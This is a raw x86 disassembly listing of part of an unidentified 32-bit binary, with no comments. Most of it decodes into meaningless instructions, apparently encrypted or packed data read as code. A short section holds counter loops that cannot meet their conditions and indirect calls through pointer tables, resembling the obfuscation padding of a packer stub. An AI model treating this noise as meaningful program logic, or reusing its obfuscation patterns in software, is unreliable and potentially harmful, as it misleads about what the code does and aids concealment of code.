  406a43:	mov    eax,DWORD PTR [ecx-0x34d2ae6d]
  406a49:	fcomp  DWORD PTR [eax+edi*4+0x25]
  406a4d:	mov    al,0xcf
  406a4f:	mov    edx,0xca341f00
  406a54:	ds pop edx
  406a56:	cdq    
  406a57:	mov    ebx,0x4ca6e4a
  406a5c:	int3   
  406a5d:	xchg   al,dl
  406a5f:	mov    eax,0x13989803
  406a64:	mov    ah,0xdf
  406a66:	xchg   edx,eax
  406a67:	retf   
  406a68:	push   es
  406a69:	aaa    
  406a6a:	mov    dh,0xb0
  406a6c:	dec    eax
  406a6d:	dec    esp
  406a6e:	or     al,0x4
  406a70:	sahf   
  406a71:	xor    DWORD PTR [edi+0x39],0xeb84e8f7
  406a78:	pop    es
  406a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7a:	add    bh,BYTE PTR [ecx]
  406a7c:	or     dl,BYTE PTR [edx+0x1b381ca7]
  406a82:	loopne 0x406a85
  406a84:	cmc    
  406a85:	dec    edi
  406a86:	mov    ds:0x385d8248,eax
  406a8b:	pop    ebp
  406a8c:	pop    ss
  406a8d:	fisubr WORD PTR [edi+0x70aa3bd3]
  406a93:	inc    ebp
  406a94:	push   edx
  406a95:	sbb    DWORD PTR [ebx],0xed5f4b3
  406a9b:	sbb    dl,BYTE PTR [edi]
  406a9d:	in     eax,dx
  406a9e:	popa   
  406a9f:	popf   
  406aa0:	daa    
  406aa1:	cmp    BYTE PTR [ecx],bl
  406aa3:	dec    ebx
  406aa4:	pop    ecx
  406aa5:	push   ecx
  406aa6:	or     edi,DWORD PTR [ebx-0x16]
  406aa9:	push   esi
  406aaa:	adc    ch,bl
  406aac:	loop   0x406aae
  406aae:	(bad)  
  406aaf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab1:	sbb    edx,DWORD PTR [eax-0x27]
  406ab4:	les    ecx,FWORD PTR [ebp+0x26]
  406ab7:	push   ds
  406ab8:	mov    ds:0xc8bf7a0c,eax
  406abd:	xchg   DWORD PTR [eax+0x5c1330d],ebx
  406ac3:	pushf  
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xd9
  406c9b:	pop    es
  406c9c:	xor    esi,DWORD PTR [ebx]
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c5d
  406ca7:	fnstsw WORD PTR [ebx-0x46]
  406caa:	call   0x6aed:0xc6fcd154
  406cb1:	aas    
  406cb2:	and    al,0x30
  406cb4:	sbb    al,0xca
  406cb6:	out    0xdf,eax
  406cb8:	fisttp WORD PTR [ebp+0x43]
  406cbb:	popf   
  406cbc:	pop    edi
  406cbd:	xchg   ebx,eax
  406cbe:	push   edi
  406cbf:	mov    bh,BYTE PTR cs:[ebx-0x4]
  406cc3:	jne    0x406c70
  406cc5:	xchg   esp,eax
  406cc6:	pusha  
  406cc7:	ja     0x406cb5
  406cc9:	jge    0x406c93
  406ccb:	cmp    BYTE PTR [ebp-0x4d542054],0x3c
  406cd2:	pop    edi
  406cd3:	mov    bl,0x60
  406cd5:	jno    0x406c94
  406cd7:	inc    edi
  406cd8:	repz (bad) 
  406cda:	adc    BYTE PTR [esi],dl
  406cdc:	pop    eax
  406cdd:	mov    ss,WORD PTR [esi-0x1b9b9073]
  406ce3:	aad    0x54
  406ce5:	xor    eax,0x3fe6df2f
  406cea:	pop    ebp
  406ceb:	cmc    
  406cec:	xchg   edi,eax
  406ced:	inc    edx
  406cee:	aaa    
  406cef:	and    BYTE PTR [edi],ah
  406cf1:	dec    esp
  406cf2:	pop    ebp
  406cf3:	or     al,BYTE PTR [edx-0x60]
  406cf6:	scas   eax,DWORD PTR es:[edi]
  406cf7:	xor    edx,DWORD PTR [esi]
  406cf9:	add    ebp,DWORD PTR [ebp-0x6e]
  406cfc:	mov    ?,WORD PTR [ebx-0x76721317]
  406d02:	inc    edx
  406d03:	sub    ebp,edx
  406d05:	adc    eax,0x64daae88
  406d0a:	dec    edi
  406d0b:	and    eax,0x1b93a378
  406d10:	xchg   ecx,eax
  406d11:	call   0x9bcf:0xdd0838d0
  406d18:	in     eax,0x38
  406d1a:	sbb    DWORD PTR [edx-0x191a68ab],ebx
  406d20:	gs add al,0xc4
  406d23:	jne    0x406cb4
  406d25:	inc    ebp
  406d26:	and    al,0xd
  406d28:	pop    ss
  406d29:	repz or edx,DWORD PTR [eax-0x5441358f]
  406d30:	xor    al,0xd3
  406d32:	dec    ecx
  406d33:	cmp    eax,0x89320c8c
  406d38:	cmp    DWORD PTR [edx+0x25],ecx
  406d3b:	lods   eax,DWORD PTR ds:[esi]
  406d3c:	lea    ecx,[ebp+0x47]
  406d3f:	cmc    
  406d40:	out    0x90,eax
  406d42:	(bad)  
  406d43:	shl    DWORD PTR [esi],cl
  406d45:	(bad)  
  406d46:	(bad)  
  406d47:	retf   0x95f
  406d4a:	and    BYTE PTR [ecx+0x1d],ah
  406d4d:	mov    BYTE PTR [esi],0xdd
  406d50:	lea    edi,[ecx+0x76a42cd4]
  406d56:	js     0x406d6d
  406d58:	push   es
  406d59:	hlt    
  406d5a:	sbb    al,0x23
  406d5c:	mov    dh,0x40
  406d5e:	mov    dl,0x77
  406d60:	cld    
  406d61:	shld   DWORD PTR [edi+ebp*8+0x28],edx,0x5b
  406d67:	ror    BYTE PTR [ebp+0x13855df6],1
  406d6d:	imul   eax,DWORD PTR [edx+0x1e61054f],0x26
  406d74:	mov    esp,0xa300ec96
  406d79:	jmp    0x88fb:0xde0642b9
  406d80:	push   es
  406d81:	rcr    BYTE PTR [ebx],0x23
  406d84:	adc    eax,DWORD PTR [edi]
  406d86:	jae    0x406d3c
  406d88:	or     al,0x64
  406d8a:	mov    eax,0x1c5123b7
  406d8f:	stc    
  406d90:	sub    edi,esp
  406d92:	sub    esi,DWORD PTR [edx+0x2f7082b3]
  406d98:	push   ss
  406d99:	cmp    DWORD PTR [ecx],esp
  406d9b:	mov    esi,0x398edcc7
  406da0:	xor    ebx,eax
  406da2:	inc    esp
  406da3:	sti    
  406da4:	jp     0x406dc5
  406da6:	jmp    0x4d314bb5
  406dab:	add    dl,BYTE PTR [edx]
  406dad:	nop
  406dae:	inc    esp
  406daf:	cwde   
  406db0:	inc    edx
  406db1:	pop    es
  406db2:	(bad)  
  406db3:	mov    esi,0x41ee7a3e
  406db8:	sbb    al,0xc9
  406dba:	lds    ebx,FWORD PTR [edi+0x7cfb17ed]
  406dc0:	mov    ds:0xe1772aef,al
  406dc5:	mov    esi,DWORD PTR [ecx-0x1c193f22]
  406dcb:	in     al,dx
  406dcc:	imul   esp,DWORD PTR [ecx+0x43],0x4c
  406dd0:	ret    0xfa46
  406dd3:	jo     0x406d65
  406dd5:	mov    BYTE PTR [edi],al
  406dd7:	fsubr  QWORD PTR [ecx-0x23b37683]
  406ddd:	sbb    eax,0xd7245b94
  406de2:	mov    ds:0x4d50250c,eax
  406de7:	dec    ebx
  406de8:	push   cs
  406de9:	dec    esp
  406dea:	gs daa 
  406dec:	gs mov ebp,0xcd705fa2
  406df2:	bound  edx,QWORD PTR [esp+eax*4+0x1099565c]
  406df9:	mov    al,BYTE PTR [edi+0x49f4580c]
  406dff:	inc    esp
  406e00:	popa   
  406e01:	aaa    
  406e02:	inc    edi
  406e03:	xor    BYTE PTR [eax],bh
  406e05:	pop    eax
  406e06:	dec    esp
  406e07:	push   ebp
  406e08:	and    eax,0xf2a554e
  406e0d:	cdq    
  406e0e:	inc    ebp
  406e0f:	jmp    0x2fc5da9f
  406e14:	mov    ?,WORD PTR [ecx-0x5f7dca34]
  406e1a:	mov    eax,0x8bd72be9
  406e1f:	mov    eax,ds:0x4748d39d
  406e24:	sahf   
  406e25:	int    0xfe
  406e27:	das    
  406e28:	mov    ebx,0xce66ff7a
  406e2d:	mov    es,WORD PTR [edi]
  406e2f:	push   es
  406e30:	(bad)
  406e33:	dec    ebx
  406e34:	call   0xdac3:0x75e43c2d
  406e3b:	scas   eax,DWORD PTR es:[edi]
  406e3c:	stc    
  406e3d:	inc    esp
  406e3e:	sbb    BYTE PTR [ecx-0x2a],al
  406e41:	retf   0xe99b
  406e44:	jno    0x406e05
  406e46:	hlt    
  406e47:	pop    esp
  406e48:	adc    al,BYTE PTR ds:0xb3c573e
  406e4e:	xor    ebp,DWORD PTR [esi]
  406e50:	ins    BYTE PTR es:[edi],dx
  406e51:	test   DWORD PTR [eax+0x7f],edi
  406e54:	jle    0x406e97
  406e56:	dec    ecx
  406e57:	fidivr WORD PTR [esi-0x8]
  406e5a:	and    eax,0xa0b8850e
  406e5f:	xor    BYTE PTR [ecx],0x54
  406e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e63:	add    al,0x71
  406e65:	jne    0x406e7d
  406e67:	leave  
  406e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6a:	pop    esp
  406e6b:	int3   
  406e6c:	xchg   ebp,eax
  406e6d:	imul   edx,edi,0x10c75138
  406e73:	dec    ecx
  406e74:	mov    al,ds:0xbe6e9132
  406e79:	and    ch,BYTE PTR [esi-0x139c5ba5]
  406e7f:	jmp    0x406eb5
  406e81:	add    ebx,DWORD PTR [ebp-0x3c]
  406e84:	add    edi,DWORD PTR [edx-0xf926323]
  406e8a:	daa    
  406e8b:	or     dh,al
  406e8d:	sub    al,0xdd
  406e8f:	xlat   BYTE PTR ds:[ebx]
  406e90:	push   edi
  406e91:	test   al,0xbe
  406e93:	mov    ecx,0xf4c12f61
  406e98:	mov    ecx,0xabfb5770
  406e9d:	adc    eax,0x15e6e10d
  406ea2:	mov    dl,BYTE PTR [ebx-0xe]
  406ea5:	xchg   edi,eax
  406ea6:	test   al,0x61
  406ea8:	shl    DWORD PTR [edi+0x4423bcec],0x74
  406eaf:	rcl    BYTE PTR [eax-0x18],cl
  406eb2:	stc    
  406eb3:	mov    esp,0xb9086be8
  406eb8:	je     0x406e4e
  406eba:	mov    al,dh
  406ebc:	sahf   
  406ebd:	aad    0x30
  406ebf:	iret   
  406ec0:	inc    ebp
  406ec1:	adc    eax,esp
  406ec3:	push   cs
  406ec4:	cdq    
  406ec5:	mov    dl,0x5a
  406ec7:	pop    edi
  406ec8:	fcmovnbe st,st(0)
  406eca:	call   0xf56b:0x943f2bfc
  406ed1:	(bad)  
  406ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ed3:	in     al,0xb7
  406ed5:	inc    ebx
  406ed6:	fcomip st,st(2)
  406ed8:	mov    esp,0xafb0da3a
  406edd:	pop    eax
  406ede:	push   0x29
  406ee0:	adc    bh,BYTE PTR [esi+eax*2]
  406ee3:	test   edx,0xc041b6e5
  406ee9:	mov    edi,0x856af6eb
  406eee:	out    0xab,al
  406ef0:	xor    dl,BYTE PTR [eax-0x27]
  406ef3:	fnstsw WORD PTR [ecx+0x66]
  406ef6:	sub    BYTE PTR [esi-0x64c43a67],bh
  406efc:	lahf   
  406efd:	lea    ebx,[edi]
  406eff:	addr16 in eax,0x41
  406f02:	jae    0x406ed1
  406f04:	mov    ds:0xb3abdb1d,al
  406f09:	cmp    bl,BYTE PTR [esi+0x5c72c608]
  406f0f:	in     al,0xe6
  406f11:	retf   0xf496
  406f14:	inc    edi
  406f15:	out    dx,eax
  406f16:	xor    DWORD PTR [eax+ecx*1-0x10],ebp
  406f1a:	pop    eax
  406f1b:	cmp    edi,edx
  406f1d:	test   eax,0x3c11a2
  406f22:	push   ss
  406f23:	mov    ebx,0x777aee08
  406f28:	je     0x406f59
  406f2a:	outs   dx,BYTE PTR ds:[esi]
  406f2b:	dec    eax
  406f2c:	mov    eax,ds:0xf4660406
  406f31:	sub    DWORD PTR [esi+0x1d929491],edi
  406f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f38:	inc    edx
  406f39:	fadd   st(3),st
  406f3b:	sbb    BYTE PTR [edi],0xd4
  406f3e:	(bad)  
  406f40:	cld    
  406f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f42:	inc    esp
  406f43:	call   0x9514:0x595d6728
  406f4a:	test   ch,al
  406f4c:	cli    
  406f4d:	int    0xc9
  406f4f:	adc    bl,BYTE PTR [ebx]
  406f51:	mov    ah,0xa0
  406f53:	and    DWORD PTR [edi-0x544b04f7],eax
  406f59:	stos   BYTE PTR es:[edi],al
  406f5a:	mov    ebx,0x4b0cbfd
  406f5f:	fldcw  WORD PTR [esi]
  406f61:	cmp    al,0xa0
  406f63:	fucomp st(3)
  406f65:	imul   edi,DWORD PTR [esi-0x113f302c],0x21bfad31
  406f6f:	into   
  406f70:	xor    al,0x4e
  406f72:	mov    esp,0xdcbc0f0d
  406f77:	inc    ecx
  406f78:	dec    ebx
  406f79:	rcr    BYTE PTR [edi-0x28],cl
  406f7c:	mov    esi,0xd97e393e
  406f81:	sar    BYTE PTR [eax],cl
  406f83:	aam    0xbb
  406f85:	dec    edx
  406f86:	xchg   DWORD PTR [ebx+0x671c19d5],ebx
  406f8c:	daa    
  406f8d:	sub    al,0xb1
  406f8f:	xor    BYTE PTR [edi-0x79],dh
  406f92:	pop    ds
  406f93:	fldcw  WORD PTR ds:0x8b795653
  406f99:	add    cl,0x19
  406f9c:	jecxz  0x406f88
  406f9e:	or     eax,0x7e9bc46
  406fa3:	and    DWORD PTR [esi-0x3dde63a0],edx
  406fa9:	sbb    eax,0x30925133
  406fae:	add    DWORD PTR [ecx+0x67],ebx
  406fb1:	jg     0x406f50
  406fb3:	arpl   WORD PTR [ebx+0xf0966ac],bp
  406fb9:	cmp    BYTE PTR [ebp+0x5],cl
  406fbc:	add    ebp,DWORD PTR ds:0x15f3a4ba
  406fc2:	lahf   
  406fc3:	xchg   ecx,eax
  406fc4:	std    
  406fc5:	aad    0x6a
  406fc7:	in     al,dx
  406fc8:	cli    
  406fc9:	stos   DWORD PTR es:[edi],eax
  406fca:	jo     0x406f83
  406fcc:	in     al,dx
  406fcd:	loopne 0x406fa2
  406fcf:	cmp    DWORD PTR [ebp+0x6e],ebx
  406fd2:	mov    ebx,ecx
  406fd4:	out    0xac,al
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx+edi*2-0x3d3861ad],ax
  407011:	jo     0x407083
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407095
  407018:	mov    ds:0xe45118ec,eax
  40701d:	sbb    al,0x2b
  40701f:	inc    ebp
  407020:	mov    edi,0xc0197906
  407025:	aas    
  407026:	jmp    0x406fdd
  407028:	ss (bad) 
  40702a:	int3   
  40702b:	xchg   edi,eax
  40702c:	popa   
  40702d:	mov    ch,0xc4
  40702f:	mov    esi,0x12bb2699
  407034:	sti    
  407035:	call   0x7a53:0x24e25b9a
  40703c:	pop    ecx
  40703d:	into   
  40703e:	dec    edi
  40703f:	data16 jno 0x406fea
  407042:	push   ebx
  407043:	xchg   esp,eax
  407044:	jg     0x40701f
  407046:	les    ebx,FWORD PTR [ebp-0x76]
  407049:	fcmovnbe st,st(6)
  40704b:	sbb    bl,BYTE PTR [edi-0x65a7fdee]
  407051:	cmc    
  407052:	xchg   edx,eax
  407053:	mov    dl,0x2e
  407055:	in     al,dx
  407056:	(bad)  
  407057:	push   DWORD PTR [ebp+ebp*4+0x4aa2b87f]
  40705e:	pusha  
  40705f:	inc    ecx
  407060:	lock es mov al,0xea
  407064:	adc    ebx,esi
  407066:	mov    dh,0x63
  407068:	pusha  
  407069:	imul   ecx,esp,0xffffffc4
  40706c:	fmul   st(6),st
  40706e:	mov    ch,0xf1
  407070:	pop    ecx
  407071:	or     al,0xb4
  407073:	loope  0x4070b0
  407075:	and    bh,bh
  407077:	in     al,dx
  407078:	mov    edx,0x6c89df93
  40707d:	pushf  
  40707e:	leave  
  40707f:	fwait
  407080:	adc    ch,0x10
  407083:	xchg   ecx,eax
  407084:	jp     0x407084
  407086:	add    ecx,esi
  407088:	shl    BYTE PTR [esp+ebp*8-0x21fc0eb7],0x61
  407090:	jg     0x407085
  407092:	mov    eax,ds:0x7696d8b1
  407097:	mov    esp,0x4fda0b41
  40709c:	jg     0x4070e0
  40709e:	pop    edi
  40709f:	fmul   DWORD PTR [edi+0x6d47063a]
  4070a5:	and    ah,BYTE PTR [ebx]
  4070a7:	ins    DWORD PTR es:[edi],dx
  4070a8:	mov    ds:0x123a875,eax
  4070ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ae:	(bad)  
  4070af:	aaa    
  4070b0:	js     0x407103
  4070b2:	arpl   WORD PTR [ebx+eax*8+0x5455d9c6],di
  4070b9:	or     al,0x19
  4070bb:	enter  0x7d96,0x4e
  4070bf:	xchg   ebp,eax
  4070c0:	and    ebx,eax
  4070c2:	fs and dh,al
  4070c5:	and    al,0x74
  4070c7:	push   cs
  4070c8:	js     0x407069
  4070ca:	fs aam 0x2a
  4070cd:	push   0xd569cc7
  4070d2:	(bad)  
  4070d3:	in     al,dx
  4070d4:	mov    es,eax
  4070d6:	pop    es
  4070d7:	adc    BYTE PTR ds:[ebp-0x29],bh
  4070db:	and    ch,BYTE PTR [eax-0x4de36b39]
  4070e1:	aaa    
  4070e2:	mov    eax,0x7178242d
  4070e7:	mov    dl,0x85
  4070e9:	scas   eax,DWORD PTR es:[edi]
  4070ea:	pushf  
  4070eb:	stos   DWORD PTR es:[edi],eax
  4070ec:	xchg   DWORD PTR [edi],eax
  4070ee:	(bad)  
  4070ef:	mov    dh,0x95
  4070f1:	mov    ebx,0x3b2e3daa
  4070f6:	push   esp
  4070f7:	sbb    BYTE PTR [ebp+0x22],bh
  4070fa:	ror    BYTE PTR [ebx],1
  4070fc:	out    0x58,eax
  4070fe:	test   al,0xf9
  407100:	mov    cl,0xd9
  407102:	fcmovnbe st,st(0)
  407104:	push   ds
  407105:	inc    edx
  407106:	xchg   ebp,eax
  407107:	(bad)  
  407108:	popa   
  407109:	into   
  40710a:	inc    ebx
  40710b:	and    ebx,DWORD PTR [esi]
  40710d:	mov    edx,0x1a988568
  407112:	mov    dl,BYTE PTR [edi]
  407114:	dec    edi
  407115:	cmp    BYTE PTR [eax],dl
  407117:	into   
  407118:	adc    eax,eax
  40711a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40711b:	sbb    al,0xcb
  40711d:	or     dl,BYTE PTR [eax-0x7]
  407120:	jge    0x4070a8
  407122:	test   DWORD PTR [edx+0x2bb104d3],eax
  407128:	push   ds
  407129:	adc    eax,0x6d8fb009
  40712e:	retf   0xc8d5
  407131:	das    
  407132:	sbb    ah,dl
  407134:	mov    bl,0x60
  407136:	inc    esi
  407137:	nop
  407138:	sub    ecx,edi
  40713a:	scas   al,BYTE PTR es:[edi]
  40713b:	loopne 0x40710a
  40713d:	adc    ecx,ebx
  40713f:	mov    ebp,DWORD PTR [edi]
  407141:	ficom  DWORD PTR [esi]
  407143:	pop    esi
  407144:	gs mov edx,0x9ad4f15e
  40714a:	frstor [ebp*8-0x2cc80f76]
  407151:	mov    eax,0xa7dec2c5
  407156:	sub    BYTE PTR [edx+0x379254e7],bh
  40715c:	(bad)  
  40715d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715e:	or     DWORD PTR [ebp-0x28b295d0],ebx
  407164:	stos   DWORD PTR es:[edi],eax
  407165:	pop    ecx
  407166:	jo     0x407128
  407168:	add    eax,0xbe7f84e5
  40716d:	sbb    ebp,DWORD PTR [ebx+0x37]
  407170:	jl     0x407147
  407172:	mov    cl,0xd2
  407174:	jo     0x407110
  407176:	adc    BYTE PTR [edi+0x5a],0x6d
  40717a:	mov    ebx,0x22c83156
  40717f:	int3   
  407180:	call   0x7631f630
  407185:	lahf   
  407186:	dec    edx
  407187:	mov    edi,0x9d1e54cb
  40718c:	xor    al,0x69
  40718e:	stos   BYTE PTR es:[edi],al
  40718f:	mul    edi
  407191:	push   ebp
  407192:	lods   eax,DWORD PTR ds:[esi]
  407193:	lock jp 0x40714c
  407196:	pusha  
  407197:	cmp    esp,DWORD PTR [edx-0x7b40b56e]
  40719d:	dec    esi
  40719e:	sti    
  40719f:	jnp    0x40712b
  4071a1:	xchg   edx,eax
  4071a2:	ins    DWORD PTR es:[edi],dx
  4071a3:	dec    edi
  4071a4:	mov    DWORD PTR [edi+ebp*1-0x7d],ebp
  4071a8:	push   0x8c11ec35
  4071ad:	jmp    0x378bac68
  4071b2:	or     edi,ebp
  4071b4:	jns    0x40715d
  4071b6:	xor    ebx,edi
  4071b8:	sbb    BYTE PTR [ecx+0x56],dl
  4071bb:	mov    ebx,0x65dbde09
  4071c0:	push   esi
  4071c1:	sahf   
  4071c2:	cmp    ebx,DWORD PTR [esi]
  4071c4:	push   edx
  4071c5:	xchg   edx,eax
  4071c6:	pop    edx
  4071c7:	sar    ebp,1
  4071c9:	imul   eax,DWORD PTR [edx],0x1e4899c
  4071cf:	repz adc al,0x95
  4071d2:	adc    bh,BYTE PTR [ebp+0x14]
  4071d5:	fstp   QWORD PTR [edx]
  4071d7:	pop    ecx
  4071d8:	mov    edx,DWORD PTR fs:[ecx]
  4071db:	call   0xcd540be6
  4071e0:	mov    bl,0x2d
  4071e2:	sub    DWORD PTR [edx-0x4f],esi
  4071e5:	mul    DWORD PTR [ebx-0x25]
  4071e8:	jnp    0x40719c
  4071ea:	aas    
  4071eb:	pop    ds
  4071ec:	mov    ds,WORD PTR ds:0xb3c17e9d
  4071f2:	xlat   BYTE PTR ds:[ebx]
  4071f3:	xchg   cl,dh
  4071f5:	mov    dl,0x12
  4071f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f8:	mov    BYTE PTR [ecx+0x44],cl
  4071fb:	fcomp  QWORD PTR [eax-0x72]
  4071fe:	adc    BYTE PTR [ebx-0x4526ba60],cl
  407204:	(bad)
  407207:	(bad)
  40720a:	aas    
  40720b:	mov    dh,BYTE PTR [ebx]
  40720d:	nop
  40720e:	jnp    0x407247
  407210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407211:	push   ebx
  407212:	cld    
  407213:	push   edi
  407214:	dec    ebp
  407215:	ins    DWORD PTR es:[edi],dx
  407216:	dec    ebp
  407217:	test   al,0x5d
  407219:	xchg   esi,eax
  40721a:	lds    esi,FWORD PTR [ecx]
  40721c:	dec    edx
  40721d:	sub    cl,BYTE PTR [edx-0x2b3c3c2a]
  407223:	mov    dl,0xcb
  407225:	lea    ebx,[ebp-0x3f]
  407228:	call   FWORD PTR [eax+ebx*2-0x69]
  40722c:	add    al,0x97
  40722e:	(bad)
  407231:	sub    DWORD PTR [esi-0x6e],esp
  407234:	fcmovu st,st(1)
  407236:	mov    ?,ebp
  407238:	das    
  407239:	sub    bh,BYTE PTR [ebp+eiz*2-0x7f]
  40723d:	inc    ecx
  40723e:	mov    ebp,0xbeb1916b
  407243:	adc    DWORD PTR [eax-0x41],esi
  407246:	imul   esp,eax,0xdaa4d3df
  40724c:	cli    
  40724d:	outs   dx,DWORD PTR ds:[esi]
  40724e:	xchg   ebp,eax
  40724f:	cmp    al,0x9d
  407251:	xor    DWORD PTR [ebp+0x45],edi
  407254:	xor    BYTE PTR [eax-0x7f],al
  407257:	cmp    DWORD PTR [edx],ebp
  407259:	imul   edx,DWORD PTR [ecx-0x3dcf7bb8],0x9ded491b
  407263:	mov    eax,ds:0x50e53b3c
  407268:	adc    cl,BYTE PTR ds:0xa5061ea5
  40726e:	loope  0x4072a4
  407270:	adc    ch,BYTE PTR [edx+0x521fa3b1]
  407276:	popa   
  407277:	xchg   ebp,eax
  407278:	inc    ebx
  407279:	adc    bl,BYTE PTR [edx-0x3f]
  40727c:	mov    ebp,0x61366bf3
  407281:	adc    BYTE PTR [ecx+eiz*1-0x70e22889],bh
  407288:	outs   dx,BYTE PTR ds:[esi]
  407289:	dec    ebx
  40728a:	dec    BYTE PTR [eax+0x13]
  40728d:	fimul  DWORD PTR [eax+0x70]
  407290:	dec    edi
  407291:	std    
  407292:	arpl   di,bp
  407294:	test   BYTE PTR [ebp-0x3318051e],dh
  40729a:	xchg   esi,eax
  40729b:	pop    edx
  40729c:	dec    edi
  40729d:	jge    0x4072f3
  40729f:	sbb    eax,0x878b0df
  4072a4:	adc    DWORD PTR [edx-0x67],ecx
  4072a7:	das    
  4072a8:	dec    edi
  4072a9:	add    ah,BYTE PTR [ecx]
  4072ab:	inc    edi
  4072ac:	jno    0x407272
  4072ae:	in     al,0x62
  4072b0:	mov    ebp,0xb1235e5c
  4072b5:	mov    edx,0x532f4bab
  4072ba:	xor    cl,BYTE PTR [ebx+0x7588b7f7]
  4072c0:	icebp  
  4072c1:	dec    eax
  4072c2:	aam    0x5c
  4072c4:	call   0x9e23:0x67ce43a7
  4072cb:	pop    ecx
  4072cc:	xchg   esp,eax
  4072cd:	xchg   ebx,eax
  4072ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072cf:	and    ebp,eax
